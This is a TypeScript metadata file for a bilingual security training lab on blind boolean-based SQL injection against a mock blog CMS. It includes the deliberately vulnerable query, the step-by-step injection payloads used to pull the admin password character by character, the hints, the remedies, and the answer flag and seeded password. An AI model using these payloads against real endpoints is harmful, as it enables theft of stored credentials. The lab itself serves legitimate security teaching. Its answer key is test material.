import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lab3Metadata: LabMetadata = {
  slug: 'sqli-blind-boolean',
  title: 'SQL Injection: Blind Boolean-Based',
  ar_title: 'حقن SQL: الأعمى القائم على البوليان',
  description:
    'No data is returned in the response — only true/false behavior. Infer hidden data character by character using boolean conditions.',
  ar_description:
    'لا تُعاد أي بيانات في الاستجابة — فقط سلوك صح/خطأ. استنتج البيانات المخفية حرفاً بحرف باستخدام الشروط البوليانية.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: ['Blind SQL Injection', 'Boolean Inference', 'Binary Search', 'Data Extraction'],
  xpReward: 200,
  pointsReward: 100,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,
  environmentType: 'BLOG_CMS',
  canonicalConceptId: 'sqli-blind',

  goal: 'Infer the admin password from the users table one character at a time using boolean-based blind SQLi.',
  ar_goal: 'استنتج كلمة مرور الأدمن من جدول المستخدمين حرفاً بحرف باستخدام حقن SQL الأعمى القائم على البوليان.',

  missionBrief: {
    codename: 'BLIND ORACLE',
    classification: 'SECRET',
    objective: 'A blog CMS shows article exists (200) vs not found (404). No data leaks in the body. Use this true/false oracle to extract the admin password byte by byte.',
    ar_objective: 'نظام إدارة المحتوى يظهر المقالة موجودة (200) أو غير موجودة (404). لا تسريب للبيانات في الجسم. استخدم هذا الـ oracle صح/خطأ لاستخراج كلمة مرور الأدمن بايت بايت.',
    background: 'This technique is used when the application gives no error messages and reflects no data — only behavior changes based on query truthfulness.',
    successCriteria: [
      'Confirm boolean injection point (true vs false response)',
      'Enumerate password length',
      'Extract each character using ASCII comparison',
      'Reconstruct the full password and get the flag',
    ],
  },

  labInfo: {
    vulnType: 'Blind Boolean-Based SQL Injection',
    ar_vulnType: 'حقن SQL الأعمى القائم على البوليان',
    cweId: 'CWE-89',
    cvssScore: 8.5,
    description: 'When no data is reflected, attackers ask yes/no questions to the database. Each boolean condition narrows down the answer until the full value is recovered.',
    ar_description: 'عندما لا تنعكس أي بيانات، يطرح المهاجمون أسئلة نعم/لا على قاعدة البيانات. كل شرط بوليان يضيّق الإجابة حتى يتم استرداد القيمة الكاملة.',
    whatYouLearn: [
      'How to confirm blind injection using true/false responses',
      'How to enumerate string length with LEN/LENGTH functions',
      'How to extract characters using ASCII() and SUBSTRING()',
      'How automated tools like sqlmap implement this attack',
    ],
    techStack: ['Node.js', 'PostgreSQL', 'Raw SQL'],
  },

  briefing: {
    en: `A blog CMS exposes an article lookup endpoint: GET /article?id=5\nArticle exists → 200 OK with content. Not found → 404.\nNo SQL errors. No data in response body.\nBut the id parameter goes directly into the query.\nCan you extract data when you can't see it?`,
    ar: `نظام إدارة المحتوى يعرض نقطة نهاية للبحث عن المقالات: GET /article?id=5\nالمقالة موجودة → 200 مع محتوى. غير موجودة → 404.\nلا أخطاء SQL. لا بيانات في جسم الاستجابة.\nلكن معامل id يذهب مباشرة للاستعلام.\nهل يمكنك استخراج البيانات دون رؤيتها؟`,
  },

  stepsOverview: {
    en: [
      'Confirm — id=5 AND 1=1 returns 200, id=5 AND 1=2 returns 404',
      'Length — id=5 AND LENGTH((SELECT password FROM users WHERE username=\'admin\'))=N',
      'Extract — id=5 AND ASCII(SUBSTRING((SELECT password FROM users...),POS,1))>N',
    ],
    ar: [
      'تأكيد — id=5 AND 1=1 يعيد 200، id=5 AND 1=2 يعيد 404',
      'الطول — id=5 AND LENGTH((SELECT password FROM users WHERE username=\'admin\'))=N',
      'استخراج — id=5 AND ASCII(SUBSTRING((SELECT password...),POS,1))>N',
    ],
  },

  solution: {
    context: 'Article lookup: SELECT * FROM articles WHERE id = $input',
    vulnerableCode: 'SELECT * FROM articles WHERE id = ' + "'$id'",
    exploitation: "5 AND 1=1-- (true→200), 5 AND 1=2-- (false→404). Then: 5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8-- to find length. Then binary search each char with ASCII(SUBSTRING(...)).",
    steps: {
      en: [
        'id=5 AND 1=1-- → 200 (confirms injection)',
        'id=5 AND 1=2-- → 404 (confirms false condition)',
        "id=5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8-- → 200",
        "id=5 AND ASCII(SUBSTRING((SELECT password FROM lab_users WHERE username='admin'),1,1))=115-- → 200 (s)",
        'Repeat for each position until full password is revealed',
      ],
      ar: [
        'id=5 AND 1=1-- → 200 (يؤكد الحقن)',
        'id=5 AND 1=2-- → 404 (يؤكد الشرط الخاطئ)',
        "id=5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8-- → 200",
        "id=5 AND ASCII(SUBSTRING((SELECT password FROM lab_users WHERE username='admin'),1,1))=115-- → 200 (s)",
        'كرر لكل موضع حتى تُكشف كلمة المرور كاملة',
      ],
    },
    fix: [
      'Use parameterized queries: WHERE id = $1',
      'Cast id to integer — reject non-numeric input',
      'Never pass user input directly into SQL',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Blind boolean SQLi exploits the application\'s binary behavior (found/not found) as a communication channel. Each boolean query retrieves one bit of information.',
      ar: 'يستغل حقن SQL الأعمى البوليان السلوك الثنائي للتطبيق (موجود/غير موجود) كقناة اتصال. كل استعلام بوليان يسترد بت واحد من المعلومات.',
    },
    impact: {
      en: 'Full database read despite no data reflection. Slower than UNION but works against any SQL endpoint with boolean-observable behavior.',
      ar: 'قراءة كاملة لقاعدة البيانات رغم عدم انعكاس البيانات. أبطأ من UNION لكن يعمل مع أي نقطة SQL مع سلوك بوليان قابل للملاحظة.',
    },
    fix: ['Parameterized queries', 'Input type validation (cast to int)', 'WAF with blind sqli signatures'],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content: "First confirm blind injection. Try:\n  /article?id=5 AND 1=1--  → should return 200 (article found)\n  /article?id=5 AND 1=2--  → should return 404 (article not found)\nDifferent responses = blind injection confirmed.",
    },
    {
      order: 2,
      xpCost: 25,
      content: "Now find the password length:\n  /article?id=5 AND LENGTH((SELECT password FROM lab_users WHERE username='admin'))=8--\nKeep trying different numbers (5,6,7,8...) until you get 200.",
    },
    {
      order: 3,
      xpCost: 40,
      content: "Extract each character using ASCII:\n  /article?id=5 AND ASCII(SUBSTRING((SELECT password FROM lab_users WHERE username='admin'),1,1))=115--\n→ ASCII 115 = 's'. Repeat for positions 2,3,4... to reconstruct the full password.",
    },
  ],

  flagAnswer: 'FLAG{SQLI_BLIND_BOOLEAN_SUCCESS}',
  initialState: {
    articles: [
      { id: 5, title: 'Getting Started with Node.js', content: 'Node.js is a JavaScript runtime...' },
    ],
    lab_users: [
      { username: 'admin', password: 'secr3t!X' },
    ],
  },
};
